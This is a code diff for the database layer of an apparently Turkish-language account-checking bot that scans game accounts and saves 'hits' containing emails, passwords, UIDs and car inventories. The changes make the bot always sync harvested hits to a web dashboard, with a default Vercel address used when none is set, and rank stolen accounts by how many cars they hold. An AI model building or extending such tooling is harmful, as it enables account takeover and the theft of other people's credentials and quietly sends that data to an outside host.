@@ -16,7 +16,8 @@ from config import (
     FREE_LIMIT,
     VIP_LIMIT,
     ADMIN_LIMIT,
-    WEB_DASHBOARD_URL
+    WEB_DASHBOARD_URL,
+    DEFAULT_WEB_DASHBOARD_URL
 )
 from proxy_manager import proxy_mgr
 
@@ -45,7 +46,8 @@ class Database:
                     created_at TEXT
                 )
             """)
-            # Yetkili / Panel Yöneticileri tablosu
+
+            # Yetkili Admin Tablosu
             await db.execute("""
                 CREATE TABLE IF NOT EXISTS admins (
                     user_id INTEGER PRIMARY KEY,
@@ -53,7 +55,26 @@ class Database:
                     created_at TEXT
                 )
             """)
-            # Tarama logları
+
+            # Taranan Hit Tablosu
+            await db.execute("""
+                CREATE TABLE IF NOT EXISTS hits (
+                    id INTEGER PRIMARY KEY AUTOINCREMENT,
+                    user_id INTEGER,
+                    email TEXT,
+                    password TEXT,
+                    uid TEXT,
+                    level INTEGER DEFAULT 0,
+                    total_cars INTEGER DEFAULT 0,
+                    unlocked_cars INTEGER DEFAULT 0,
+                    custom_cars INTEGER DEFAULT 0,
+                    clan_id TEXT,
+                    details_json TEXT,
+                    created_at TEXT
+                )
+            """)
+
+            # Tarama Geçmişi Tablosu
             await db.execute("""
                 CREATE TABLE IF NOT EXISTS scans (
                     id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -66,39 +87,25 @@ class Database:
                     created_at TEXT
                 )
             """)
-            # Hit kayıtları
-            await db.execute("""
-                CREATE TABLE IF NOT EXISTS hits (
-                    id INTEGER PRIMARY KEY AUTOINCREMENT,
-                    user_id INTEGER,
-                    email TEXT,
-                    password TEXT,
-                    uid TEXT,
-                    level INTEGER,
-                    total_cars INTEGER,
-                    unlocked_cars INTEGER,
-                    custom_cars INTEGER,
-                    clan_id TEXT,
-                    details_json TEXT,
-                    created_at TEXT
-                )
-            """)
+
+            # Bot Sahibi / Adminleri Tabloya Varsayılan Olarak Ekle
+            now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            for admin_id in ADMIN_USER_IDS:
+                await db.execute("""
+                    INSERT INTO admins (user_id, added_by, created_at)
+                    VALUES (?, ?, ?)
+                    ON CONFLICT(user_id) DO NOTHING
+                """, (admin_id, 0, now))
+
             await db.commit()
 
     async def is_admin_or_authorized(self, user_id: int) -> bool:
-        """Kullanıcının Panel / Proxy yetkisi olup olmadığını kontrol eder."""
-        # 1. config/env içindeki Root Adminler
-        if ADMIN_USER_IDS and user_id in ADMIN_USER_IDS:
+        """Kullanıcının bot sahibi veya yetkili admin olup olmadığını doğrular."""
+        if user_id in ADMIN_USER_IDS:
             return True
-
-        # 2. Eğer ADMIN_USER_IDS hiç ayarlanmadıysa ilk aşamada yetki ver
-        if not ADMIN_USER_IDS:
-            return True
-
-        # 3. Veritabanındaki yetkili yöneticiler
         async with aiosqlite.connect(self.db_path) as db:
             db.row_factory = aiosqlite.Row
-            cursor = await db.execute("SELECT user_id FROM admins WHERE user_id = ?", (user_id,))
+            cursor = await db.execute("SELECT 1 FROM admins WHERE user_id = ?", (user_id,))
             row = await cursor.fetchone()
             if row:
                 return True
@@ -225,7 +232,8 @@ class Database:
         Toplu hitleri:
         1. SQLite veritabanına,
         2. Genel hits/ klasörüne,
-        3. Kullanıcıya özel results/<username>/ klasörüne kaydeder.
+        3. Kullanıcıya özel results/<username>/ klasörüne kaydeder,
+        4. Vercel Web Dashboard'a canlı senkronize eder.
         """
         if not hits_list:
             return
@@ -275,7 +283,7 @@ class Database:
         except Exception as e:
             print(f"⚠️ hits/ klasörüne yazılırken hata: {e}")
 
-        # 3. 🎯 Kullanıcıya Özel results/<username>/ Klasörüne Kayıt
+        # 3. Kullanıcıya Özel results/<username>/ Klasörüne Kayıt
         target_user_folder = sanitize_folder_name(username or f"user_{user_id}")
         user_dir = os.path.join(RESULTS_DIR, target_user_folder)
         os.makedirs(user_dir, exist_ok=True)
@@ -308,17 +316,15 @@ class Database:
             print(f"⚠️ results/{target_user_folder} klasörüne yazılırken hata: {e}")
 
         # 4. 🌐 Web Dashboard'a Canlı Senkronizasyon (Vercel vb.)
-        if WEB_DASHBOARD_URL:
-            try:
-                asyncio.create_task(self.sync_hits_to_web(hits_list))
-            except Exception:
-                pass
+        try:
+            asyncio.create_task(self.sync_hits_to_web(hits_list))
+        except Exception:
+            pass
 
     async def sync_hits_to_web(self, hits_list: List[dict]):
         """Web Paneline (Vercel vb.) anlık hit ve istatistikleri senkronize eder."""
-        target_url = WEB_DASHBOARD_URL or "https://tempapims-efes-projects-602609c9.vercel.app"
+        target_url = WEB_DASHBOARD_URL or DEFAULT_WEB_DASHBOARD_URL
         try:
-            # Hafif ve hızlı veri yapısına dönüştür (Megabaytlarca gereksiz token yükünü at)
             clean_hits = []
             for h in hits_list:
                 clean_hits.append({
@@ -393,18 +399,18 @@ class Database:
                 "hits": row["hits"] or 0,
             }
 
-    async def get_recent_hits(self, limit: int = 10, user_id: Optional[int] = None) -> List[Dict[str, Any]]:
-        """En son bulunan hitleri listeler."""
+    async def get_recent_hits(self, limit: int = 50, user_id: Optional[int] = None) -> List[Dict[str, Any]]:
+        """En son bulunan hitleri en dolu araçlara göre listeler."""
         async with aiosqlite.connect(self.db_path) as db:
             db.row_factory = aiosqlite.Row
             if user_id:
                 cursor = await db.execute(
-                    "SELECT * FROM hits WHERE user_id = ? ORDER BY id DESC LIMIT ?",
+                    "SELECT * FROM hits WHERE user_id = ? ORDER BY total_cars DESC, id DESC LIMIT ?",
                     (user_id, limit)
                 )
             else:
                 cursor = await db.execute(
-                    "SELECT * FROM hits ORDER BY id DESC LIMIT ?",
+                    "SELECT * FROM hits ORDER BY total_cars DESC, id DESC LIMIT ?",
                     (limit,)
                 )
             rows = await cursor.fetchall()
